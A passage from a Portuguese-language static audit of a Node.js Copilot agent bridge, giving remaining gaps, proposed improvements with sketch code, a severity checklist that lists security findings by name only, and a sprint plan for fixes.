### 🟡 GAP-02 — `buildMcpSchema` não suporta objetos aninhados, enums ou `$ref`

**Arquivo**: `src/copilot/bridges/mcp-tool-bridge.js`

**Problema**: A função `buildZodSchema` aceita apenas objetos planos com propriedades escalares. MCP servers reais usam schemas complexos com tipos aninhados, enums, e referências. Isso leva a parâmetros dropados silenciosamente.

```javascript
// Tipos não suportados (mapeados para z.string()):
// - enum: ["a", "b", "c"]
// - array of objects: [{ type: "object", properties: {...} }]
// - oneOf / anyOf
// - $ref: "#/definitions/..."
```

**Melhoria**: Adicionar suporte a enums e arrays de objetos.

```javascript
function buildZodSchema(inputSchema) {
    // ...
    for (const [key, prop] of Object.entries(schema.properties ?? {})) {
        let field;
        switch (prop.type) {
            // ... tipos existentes ...
            case 'string':
                if (Array.isArray(prop.enum) && prop.enum.length > 0) {
                    // Suporte a enums
                    field = z.enum(/** @type {[string, ...string[]]} */ (prop.enum)).describe(description);
                } else {
                    field = z.string().describe(description);
                }
                break;
            case 'array':
                if (prop.items?.type === 'object' && prop.items.properties) {
                    // Array de objetos — recursão
                    field = z.array(buildZodSchema(prop.items)).describe(description);
                } else {
                    field = z.array(z.unknown()).describe(description);
                }
                break;
            // ...
        }
    }
}
```

---

### 🟡 GAP-03 — `POST /send` com `waitForResponse=false` retorna status potencialmente incorreto

**Arquivo**: `src/copilot/api/bridge-tasks.js`

**Problema**: Quando `waitForResponse=false`, o endpoint retorna imediatamente com `{ ok: true, message: 'Mensagem enfileirada.' }` mesmo que a fila esteja cheia e o `sendMessage` seja rejeitado imediatamente:

```javascript
agent.sendMessage(message, {...})
    .catch((e) => {
        log('WARN', `[bridge-tasks/send] Tarefa assíncrona falhou: ${e.message}`);
        // ← o cliente já recebeu "ok: true" — nunca saberá da falha
    });
return res.json({ ok: true, message: 'Mensagem enfileirada.', status: agent.status });
```

**Correção**: Verificar a capacidade da fila antes de enfileirar.

```javascript
if (!waitForResponse) {
    // Verificar se a fila comporta mais uma tarefa
    const snap = agent.getStatusSnapshot();
    if (snap.queueSize >= AlwaysAliveAgent.MAX_QUEUE_SIZE) {
        return res.status(503).json({
            ok: false,
            error: `Fila cheia (${snap.queueSize}/${AlwaysAliveAgent.MAX_QUEUE_SIZE}). Tente novamente.`
        });
    }

    agent.sendMessage(message, {...}).catch((e) => {
        log('WARN', `[bridge-tasks/send] Tarefa assíncrona falhou: ${e.message}`);
    });
    return res.json({ ok: true, message: 'Mensagem enfileirada.', queueSize: snap.queueSize + 1 });
}
```

---

### 🟢 GAP-04 — `LLM-A-COMMUNICATION-GUIDE.md` referencia paths desatualizados

**Arquivo**: `src/copilot/LLM-A-COMMUNICATION-GUIDE.md`

**Problema**: O mapa de arquivos na seção 9 lista localizações pré-refatoração:

```
src/copilot/
├── agent.js          ← arquivo de re-export deprecated
├── always-alive.js   ← idem
├── llm-bridge-client.js ← idem
```

Após a Fase I/J da refatoração, a estrutura canônica é:

```
src/copilot/
├── agent/
│   ├── always-alive.js   ← CANÔNICO
│   ├── session-manager.js
│   └── ...
├── channel/
│   ├── client.js         ← CANÔNICO (LlmBridgeClient)
│   └── ...
├── bridges/
│   ├── nerv-bridge.js    ← CANÔNICO
│   └── ...
```

**Ação**: Atualizar o mapa de arquivos na seção 9 e adicionar nota sobre aliases `#copilot/*`.

---

## 7. Melhorias Propostas

### 🔵 MELHORIA-01 — Adicionar `listenerDiagnostics` ao healthcheck

**Arquivo**: `src/copilot/api/bridge-control.js`

O método `listenerDiagnostics()` já existe em `AlwaysAliveAgent` mas nunca é exposto via API. Adicionar ao endpoint `/health`:

```javascript
// bridge-control.js:
bridge.get('/health', (_req, res) => {
    const snap = agent.getStatusSnapshot();
    const healthy = ['idle', 'processing', 'waiting_for_input'].includes(snap.status);
    res.status(healthy ? 200 : 503).json({
        healthy,
        status: snap.status,
        sessionId: snap.sessionId,
        queueSize: snap.queueSize,
        starvationAlert: snap.starvationAlert,
        uptime: snap.startedAt !== null ? Date.now() - snap.startedAt : null,
        listenerDiagnostics: agent.listenerDiagnostics(),  // ← NOVO: detecta leaks
    });
});
```

---

### 🔵 MELHORIA-02 — Instrumentação OpenTelemetry para `executeTask`

**Arquivo**: `src/copilot/agent/task-executor.js`

O projeto tem o Sprint 23 (OpenTelemetry) listado como pendente. O `executeTask` é o ponto natural para instrumentação:

```javascript
import { trace, metrics } from '@opentelemetry/api';

const tracer = trace.getTracer('copilot-agent');
const taskDurationHistogram = metrics.getMeter('copilot-agent')
    .createHistogram('copilot.task.duration', {
        description: 'Duração de tarefas LLM-B em ms',
        unit: 'ms',
    });

export async function executeTask(session, task, callbacks) {
    const span = tracer.startSpan('copilot.task', {
        attributes: {
            'task.id': task.id,
            'task.message_length': task.message.length,
        },
    });

    try {
        // ... lógica existente ...
        span.setStatus({ code: SpanStatusCode.OK });
        taskDurationHistogram.record(durationMs, { 'task.success': 'true' });
    } catch (e) {
        span.setStatus({ code: SpanStatusCode.ERROR, message: e.message });
        span.recordException(e);
        taskDurationHistogram.record(Date.now() - startMs, { 'task.success': 'false' });
        throw e;
    } finally {
        span.end();
    }
}
```

---

### 🔵 MELHORIA-03 — Suporte a `attachments` em `handleInject`

**Arquivo**: `src/copilot/terminal/http-handlers.js`

O `injectToLlmB` em `channel/inject.js` já suporta `attachments` (referências de arquivo SDK), mas `handleInject` no terminal server ignora esse campo. LLM-A poderia enviar referências de arquivo diretamente, sem precisar embutir o conteúdo no texto.

```javascript
export async function handleInject(body) {
    const message = body?.message?.trim();
    if (!message) return { status: 400, body: { ok: false, error: '"message" é obrigatório' } };

    const from = body?.from ?? 'llm-a';
    const attachments = body?.attachments;  // ← NOVO: suporte a attachments SDK

    let enrichedMessage = message;
    // ... embed de context_files ...

    const reply = await sendTurn(enrichedMessage, from, { attachments });
    // ...
}
```

---

### 🔵 MELHORIA-04 — `StructuredMessage` — campo `traceId` para correlação de logs

**Arquivo**: `src/copilot/types/structured-message.js`

Adicionar um campo de correlação para rastreabilidade fim-a-fim entre LLM-A, LLM-B, e o `ConversationStore`:

```javascript
export const StructuredMessageSchema = z.object({
    version: z.string().default('1.0'),
    traceId: z.string().optional(),  // ← NOVO: UUID v4, gerado por LLM-A, propagado
    context: z.string().min(1),
    intent: z.string().min(1),
    priority: z.enum(['low', 'medium', 'high', 'critical']).default('medium'),
    responseType: z.enum(['diagnostic', 'plan', 'code', 'question', 'confirmation', 'error']),
    output: z.string().optional(),
    sessionId: z.string().optional(),
    turnNumber: z.number().int().min(0).optional(),
    toolsUsed: z.array(z.string()).optional(),
    meta: z.record(z.string(), z.unknown()).optional(),
});

// Em buildStructuredRequest:
export function buildStructuredRequest(input) {
    return StructuredMessageSchema.parse({
        traceId: input.traceId ?? crypto.randomUUID(),  // ← auto-gerado
        ...input,
    });
}
```

---

### 🔵 MELHORIA-05 — `ConversationHub` — suporte a múltiplos SDK sessions por hub_session

**Arquivo**: `src/copilot/conversation-hub/store.js`

Atualmente `hub_sessions` tem um único `sdk_session_id`. Com a funcionalidade de reconexão automática do `AlwaysAliveAgent`, o SDK session ID muda a cada restart, mas o `hub_session` deve sobreviver. O campo `sdk_session_id` deveria ser uma relação 1:N (histórico de SDK sessions por hub_session).

```sql
-- Nova tabela de histórico de SDK sessions
CREATE TABLE IF NOT EXISTS copilot_sdk_session_log (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    hub_session_id TEXT NOT NULL,
    sdk_session_id TEXT NOT NULL,
    started_at  INTEGER NOT NULL,
    ended_at    INTEGER,
    reason      TEXT,  -- 'created' | 'reconnected' | 'expired'
    FOREIGN KEY (hub_session_id) REFERENCES copilot_hub_sessions(id)
);
```

---

### 🔵 MELHORIA-06 — Expor `CHANNEL_VERSION` no health endpoint

**Arquivo**: `src/copilot/channel/index.js` · `src/copilot/api/bridge-control.js`

O `CHANNEL_VERSION = '1'` é definido mas nunca exposto via API. Útil para verificar compatibilidade entre versões de LLM-A e LLM-B.

```javascript
// bridge-control.js:
bridge.get('/status', (_req, res) => {
    res.json({
        ok: true,
        channelVersion: CHANNEL_VERSION,  // ← NOVO
        ...agent.getStatusSnapshot()
    });
});
```

---

## 8. Checklist de Revisão Consolidado

| ID      | Severidade | Arquivo Principal                       | Status                                               |
| ------- | ---------- | --------------------------------------- | ---------------------------------------------------- |
| BUG-01  | 🔴 Crítico  | `agent/always-alive.js`                 | Watchdog não parado no `stop()`                      |
| BUG-02  | 🔴 Crítico  | `agent/always-alive.js`                 | Leak de listener em `sendDialogTurn`                 |
| BUG-03  | 🔴 Crítico  | `conversation-hub/store.js`             | Race condition em `writeTurn`                        |
| BUG-04  | 🔴 Crítico  | `channel/client.js` + `orchestrator.js` | `parseError` nunca populado                          |
| BUG-05  | 🟠 Alto     | `terminal/commands/context.js`          | Mutação de `ReadonlyArray`                           |
| BUG-06  | 🟠 Alto     | `conversation-hub/orchestrator.js`      | `agentOverride` ignorado                             |
| BUG-07  | 🟠 Alto     | `agent/always-alive.js`                 | `stop()` durante `starting`                          |
| BUG-08  | 🟠 Alto     | `agent/always-alive.js`                 | `DialogWatchdog` duplicado                           |
| BUG-09  | 🟠 Alto     | `conversation-hub/socket-ns.js`         | Dynamic import em hot-path                           |
| SEC-01  | 🔴 Crítico  | `tools/shell-tools.js`                  | Injeção de shell em `exec_command`                   |
| SEC-02  | 🔴 Crítico  | `conversation-hub/store.js`             | SQL injection via FTS5                               |
| SEC-03  | 🟠 Alto     | `tools/file-tools.js`                   | Injeção de shell em `search_in_files`                |
| SEC-04  | 🟠 Alto     | `tools/file-tools.js`                   | Symlink traversal em `validatePath`                  |
| SEC-05  | 🟡 Médio    | `tools/shell-tools.js`                  | Scripts sensíveis executáveis                        |
| PERF-01 | 🟠 Alto     | `agent/always-alive.js`                 | I/O síncrono em hot-path                             |
| PERF-02 | 🟠 Alto     | `agent/always-alive.js`                 | `readState()` em cada `getStatusSnapshot`            |
| PERF-03 | 🟡 Médio    | `conversation-hub/store.js`             | FTS5 sem tokenizer pt-BR                             |
| ARCH-01 | 🟠 Alto     | `src/copilot/*.js`                      | 13 re-exports deprecated sem remoção planejada       |
| ARCH-02 | 🟠 Alto     | `bridges/nerv-bridge.js`                | 13 eventos não mapeados para NERV                    |
| ARCH-03 | 🟡 Médio    | `channel/client.js`                     | Múltiplos `LlmBridgeClient` com histórico divergente |
| ARCH-04 | 🟡 Médio    | `conversation-hub/hub.js`               | Degradação do hub invisível ao health check          |
| ARCH-05 | 🟡 Médio    | `agent/session-manager.js`              | `import.meta.dirname` sem fallback                   |
| TYPE-01 | 🟠 Alto     | `conversation-hub/orchestrator.js`      | Cast `any` em `dialogLoopActive`                     |
| TYPE-02 | 🟡 Médio    | `types/structured-message.js`           | Typedef desatualizado (`priority`)                   |
| TYPE-03 | 🟡 Médio    | `api/bridge-tasks.js`                   | `attachments` sem tipo no body                       |
| TYPE-04 | 🟡 Médio    | `tools/hub-tools.js`                    | `z.any()` em metadata                                |
| GAP-01  | 🟡 Médio    | `terminal/server.js`                    | Rate limiting ausente em `/inject`                   |
| GAP-02  | 🟡 Médio    | `bridges/mcp-tool-bridge.js`            | Schema MCP incompleto                                |
| GAP-03  | 🟡 Médio    | `api/bridge-tasks.js`                   | Retorno enganoso em fila cheia                       |
| GAP-04  | 🟢 Baixo    | `LLM-A-COMMUNICATION-GUIDE.md`          | Paths desatualizados                                 |

---

## 9. Prioridade de Execução

### Sprint Imediato (1–2 dias)
1. **BUG-01** — Adicionar `this.#watchdog?.stop()` em `AlwaysAliveAgent.stop()`
2. **BUG-03** — Envolver `writeTurn` em transação `db.transaction()`
3. **BUG-04** — Definir e popular `parseError` em `chatStructured`
4. **SEC-02** — Sanitização FTS5 com frase exata

### Sprint Curto (3–5 dias)
5. **BUG-02** — Reescrever o tratamento de listeners em `sendDialogTurn`
6. **BUG-05** — Substituir mutação direta por `clearHistory()` + `seedHistory()`
7. **SEC-01** — Tokenizar comandos em `exec_command`
8. **SEC-04** — Resolver symlinks em `validatePath`
9. **PERF-01** — Cache de `sendCount`/`resumeCount` em memória

### Sprint Médio (1–2 semanas)
10. **ARCH-02** — Mapear todos os `AGENT_EVENTS` no NERV bridge
11. **BUG-06** — Usar `this.#agent ?? alwaysAliveAgent` em `#getActiveSdkSessionId`
12. **GAP-01** — Implementar rate limiting em `/inject`
13. **MELHORIA-04** — Adicionar `traceId` ao `StructuredMessage`
14. **PERF-02** — Cache TTL para `getStatusSnapshot`

---

*Auditoria produzida por análise estática de 101 arquivos. Nenhuma execução de código foi realizada — recomenda-se validação via `npm run test:unit` e `npm run typecheck:node` após cada correção.*
